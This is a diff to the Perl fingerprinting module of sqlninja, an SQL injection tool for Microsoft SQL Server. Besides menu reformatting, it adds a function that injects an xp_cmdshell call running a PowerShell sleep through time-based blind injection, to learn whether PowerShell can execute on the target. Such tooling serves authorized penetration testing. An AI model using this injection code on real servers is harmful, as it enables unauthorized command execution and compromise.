@@ -1,5 +1,5 @@
 # This file is part of sqlninja
-# Copyright (C) 2006-2013
+# Copyright (C) 2006-2014
 # http://sqlninja.sourceforge.net
 # icesurfer <r00t@northernfortress.net>
 # nico <nico@leidecker.info>
@@ -43,18 +43,19 @@ sub fingerprint
 	}
 
  	my @m = (
-		[	'0',	'Database version (2000/2005/2008/2012)', 						\&fingerprint_version	],
-		[	'1',	'Database user',											\&fingerprint_user		],
-		[	'2',	'Database user rights',										\&fingerprint_sysadmin	],
-		[	'3',	"Whether $opt_xp is working",								\&fingerprint_shell	],
+		[	'0',	'Database version (2000/2005/2008/2012)', 			\&fingerprint_version	],
+		[	'1',	'Database user',						\&fingerprint_user	],
+		[	'2',	'Database user rights',						\&fingerprint_sysadmin	],
+		[	'3',	"Whether $opt_xp is working",					\&fingerprint_shell	],
 		[	'4',	'Whether mixed or Windows-only authentication is used',		\&fingerprint_auth	],
-		[	'5',	$opt_working,												\&fingerprint_sqlsrvuser	],
-		[	'6',	"Current database name",									\&fingerprint_dbname	],
-		[	'7',	"Client IP address\n",									\&fingerprint_client_net	],
+		[	'5',	$opt_working,							\&fingerprint_sqlsrvuser	],
+		[	'6',	"Current database name",					\&fingerprint_dbname	],
+		[	'7',	"Client IP address ('client_net_address')",			\&fingerprint_client_net	],
+		[	'8',	"Whether powershell is available\n",				\&fingerprint_powershell	],
 
-		[	'a',	'All of the above',											\&fingerprint_all ],
-		[	'h',	'Print this menu',											undef	],
-		[	'q',	'quit',														\&fingerprint_quit	]
+		[	'a',	'All of the above',						\&fingerprint_all ],
+		[	'h',	'Print this menu',						undef	],
+		[	'q',	'quit',								\&fingerprint_quit	]
  	);
 
 	show_menu(\@m, "\nWhat do you want to discover?");
@@ -88,6 +89,12 @@ sub fingerprint_all
 
 	# fingerprint current database name
 	fingerprint_dbname();
+
+	#fingerprint client IP address
+	fingerprint_client_net();
+
+	#fingerprint powershell
+	fingerprint_powershell();
 }
 
 # Using inference-based SQL Injection, figures out whether we are talking to a 
@@ -454,4 +461,23 @@ sub fingerprint_client_net
 
 }
 
+sub fingerprint_powershell
+{
+	print "[+] Checking if powershell is available...\n";
+
+	my $is_working = 0;
+	my $query = "exec master..". $conf->{'xp_name'} ." 'powershell \"sleep ".$conf->{'blindtime'} ."\"'";
+	my $delay = tryblind($query);
+	if ($delay > ($conf->{'blindtime'} - 2)) {
+		$is_working = 1;
+	}
+
+	if ($is_working == 1) {
+		print "    powershell is working!\n";
+	} else {
+		print "    powershells is not working.\n";
+
+	}
+
+}
 1;
